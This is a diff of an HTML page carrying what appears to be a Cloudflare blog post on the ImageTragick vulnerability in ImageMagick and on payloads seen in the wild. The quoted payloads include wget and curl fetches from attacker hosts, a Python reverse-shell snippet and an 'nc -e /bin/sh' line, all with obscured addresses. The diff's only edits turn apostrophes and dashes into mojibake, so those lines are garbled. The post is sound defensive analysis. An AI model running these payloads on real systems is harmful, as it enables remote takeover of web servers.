@@ -8,14 +8,14 @@
 	<p>As ever, it is critical that users of ImageMagick <a href="https://www.imagemagick.org/script/changelog.php">upgrade</a> as quickly as possible to be fully protected.</p>
 	<h3 id="shellshock2">Shellshock 2?</h3>
 	<p>Back in 2014 I wrote about another nasty code execution vulnerability called <a href="https://blog.cloudflare.com/inside-shellshock">Shellshock</a>. In that blog post I wrote:</p>
-	<p><em>The Shellshock problem is an example of an <a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">arbitrary code execution</a> (ACE) vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly language—in short, this type of attack requires an expert.</em></p>
+	<p><em>The Shellshock problem is an example of an <a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">arbitrary code execution</a> (ACE) vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly languageâ€”in short, this type of attack requires an expert.</em></p>
 	<p><img src="https://blog.cloudflare.com/content/images/2016/05/illustration-bash-blog-1.png" alt="" loading="lazy"></p>
 	<p><em>Attacker will also use an ACE vulnerability to upload or run a program that gives them a simple way of controlling the targeted machine. This is often achieved by running a "shell". A shell is a command-line where commands can be entered and executed.</em></p>
 	<p><em>The Shellshock vulnerability is a major problem because it removes the need for specialized knowledge, and provides a simple (unfortunately, very simple) way of taking control of another computer (such as a web server) and making it run code.</em></p>
 	<p>Sadly, the same is true of ImageTragick: attackers do not need to be sophisticated to take advantage of it and run arbitrary code on a vulnerable web server. Shellshock was especially nasty because of how widespread the vulnerability was; ImageTragick is less widespread but a real problem for sites that use it to manipulate images that users upload.</p>
 	<h3 id="reconnaissance">Reconnaissance</h3>
 	<p>We began watching the exploitation of CVE-2016-3714 as soon as the WAF rule went live across our network. The bad news is that this vulnerability is being actively used by hackers to attack websites.</p>
-	<p>I’ve gathered examples of the most popular payloads being used by hackers. These are not weaponized as I have removed the image wrapping from around the payloads to ensure that they cannot simply be copied and pasted to perform an attack. I have also obscured IP addresses and website names used by attackers.</p>
+	<p>Iâ€™ve gathered examples of the most popular payloads being used by hackers. These are not weaponized as I have removed the image wrapping from around the payloads to ensure that they cannot simply be copied and pasted to perform an attack. I have also obscured IP addresses and website names used by attackers.</p>
 	<p><img src="https://blog.cloudflare.com/content/images/2016/05/4968376506_9021f8ba78_z.jpg" alt="" loading="lazy"><br>
 		<small><a href="https://creativecommons.org/licenses/by/2.0">CC BY 2.0</a> <a href="https://www.flickr.com/photos/jason_ff/4968376506/in/photolist-nppKpF-9maSMt-6UjRg3-8dZ2v1-9maSMF-ciWDeQ-8wyQBR-8wyMtg-bHAn9H-8wBWpd-Br4Jmk-8wUBkj-8wRBy2-8wyMna-Hkuoq-2GfCf3-7Fb2i-9sBsEq-ojiew6-8NRizs-aadh3q-aadhhj-8z3eeU-qobKXg-CosgiZ-CdT34E-8wBPi9-8wyWPR-66mmrK-2VkSj5-fwm2w-2EJZZ1-azHtta">image</a> by <a href="https://www.flickr.com/photos/jason_ff">Jason Brennan</a></small>
 	</p>
@@ -34,7 +34,7 @@ x="0" y="0" height="140px" width="140px"/&gt;
 	<pre><code>fill 'url(https://127.0.0.0/sdfsdf.jpg"|wget -o- a0074942.example.com/dfgdfg &gt;
 "/tmp/dfgfdgfdg)'
 </code></pre>
-	<p>The attacker downloads a file (presumably from a server they control) using wget and saves it to a file on the website’s server. This could be the prelude to a larger attack and the contents of the temporary file would likely contain a program to be executed on the web server giving the attacker access.</p>
+	<p>The attacker downloads a file (presumably from a server they control) using wget and saves it to a file on the websiteâ€™s server. This could be the prelude to a larger attack and the contents of the temporary file would likely contain a program to be executed on the web server giving the attacker access.</p>
 	<p><img src="https://blog.cloudflare.com/content/images/2016/05/52823834_5429a6e452_z.jpg" alt="" loading="lazy"><br>
 		<small><a href="https://creativecommons.org/licenses/by-sa/2.0">CC BY-SA 2.0</a> <a href="https://www.flickr.com/photos/eklektikos/52823834/in/photolist-5EJFL-nCKUnd-5G4WGv-8iogvR-e8Smqc-9eXH23-oXmq66-ChqSEh-8Enzct-Byd9kC-apKYx5-6VZ7U7-8KibTc-8poYHx-63hmpb-gZ7WnC-66xzCZ-nxAbfy-5S7sx2-3FshC-dxEaU-7pPAjY-bJHYtV-oH5R5e-9jTMKP-ac28HM-oJ44cc-4aZN82-JciZ3-Nvcgu-4L34v1-9EMzzd-9mTWFx-9mWYV9-fMQmU2-5GZon4-aJDuEp-4jDMhn-k7N6qc-8P9AZr-hG7WGu-335tK9-9VGNyf-5ppck5-7KgP26-6uqKfV-5tYMxX-9fKY8H-aJDuFk-9fKYgZ">image</a> by <a href="https://www.flickr.com/photos/eklektikos/52823834/in/photolist-5EJFL-nCKUnd-5G4WGv-8iogvR-e8Smqc-9eXH23-oXmq66-ChqSEh-8Enzct-Byd9kC-apKYx5-6VZ7U7-8KibTc-8poYHx-63hmpb-gZ7WnC-66xzCZ-nxAbfy-5S7sx2-3FshC-dxEaU-7pPAjY-bJHYtV-oH5R5e-9jTMKP-ac28HM-oJ44cc-4aZN82-JciZ3-Nvcgu-4L34v1-9EMzzd-9mTWFx-9mWYV9-fMQmU2-5GZon4-aJDuEp-4jDMhn-k7N6qc-8P9AZr-hG7WGu-335tK9-9VGNyf-5ppck5-7KgP26-6uqKfV-5tYMxX-9fKY8H-aJDuFk-9fKYgZ">Todd Ehlers</a></small>
 	</p>
@@ -43,7 +43,7 @@ x="0" y="0" height="140px" width="140px"/&gt;
 -o /tmp/x.py &amp;&amp; python /tmp/x.py xx.xx.15.179 80")'
 </code></pre>
 	<p>This downloads a python program called <code>x.py</code> from a server the attack controls, saves it as <code>/tmp/x.py</code> and then executes it. The parameters to the program are the IP address and port of a machine to contact. The python code connects to that machine and makes a shell available on the web server to the attacker. At that point the attacker can interact directly with the web server.</p>
-	<p>Here’s a snippet of the downloaded program:</p>
+	<p>Hereâ€™s a snippet of the downloaded program:</p>
 	<pre><code># -*- coding:utf-8 -*-
 #!/usr/bin/env python
 """
@@ -93,7 +93,7 @@ s.connect(("xx.xx.24.85"\x2c443));p=subprocess.call(\x5b"/bin/sh"\x2c"-i"\x5d);\
 fill 'url(https://profile-photos.example.com/production/000/003/658/b4eb8_
 xtralarge.png"|nc -e /bin/sh xx.xx.151.208
 </code></pre>
-	<p>The first uses <a href="http://linux.die.net/man/1/setsid">setsid</a> to create a new session and then hooks up the bash shell to a TCP connection back to the hacker’s server. The second uses <a href="http://linux.die.net/man/1/nc">nc</a> to attempt the same thing.</p>
+	<p>The first uses <a href="http://linux.die.net/man/1/setsid">setsid</a> to create a new session and then hooks up the bash shell to a TCP connection back to the hackerâ€™s server. The second uses <a href="http://linux.die.net/man/1/nc">nc</a> to attempt the same thing.</p>
 	<p>All these payloads are designed to give the hacker unfettered access to the vulnerable web server. With a single exploit they can get remote access and then proceed to further hack the vulnerable web server at their leisure.</p>
 	<h3 id="conclusion">Conclusion</h3>
 	<p>CloudFlare continually updates our WAF as vulnerabilities are found and customers get automatic protection. Nevertheless, we urge all users of ImageMagick to upgrade as quickly as possible.</p>
